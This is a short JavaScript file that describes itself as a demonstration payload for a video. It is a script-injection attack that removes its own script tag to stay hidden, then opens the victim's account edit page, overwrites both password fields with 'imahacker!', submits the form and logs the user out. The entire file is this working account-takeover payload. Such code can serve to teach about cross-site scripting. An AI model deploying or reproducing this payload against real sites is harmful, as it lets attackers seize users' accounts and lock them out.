//a youtube demonstration payload that can change the users password to whatever you please
var src = '"'+document.currentScript.src.slice(6)+'"';

var oldHtml = document.body.innerHTML;

var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src="+src+">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters

document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + ("<script src="+src+">").length );
//now we do the payload: change their password!
var passInputs;

var newPassword = "imahacker!";
if (!jQuery("disabled")){
  if (location.href == document.querySelector('.welcome-edit-link').href) {
    passInputs = document.querySelectorAll("input[type=password]");
    passInputs[0].value = newPassword;
    passInputs[1].value = newPassword;
    jQuery.cookie("logout", true);
    document.querySelector("form")[1].submit();
  } else if (jQuery.cookie("logout")) {
    location.pathname = "/user/logout";
  } else {
    location.href = document.querySelector('.welcome-edit-link').href;
  };
};
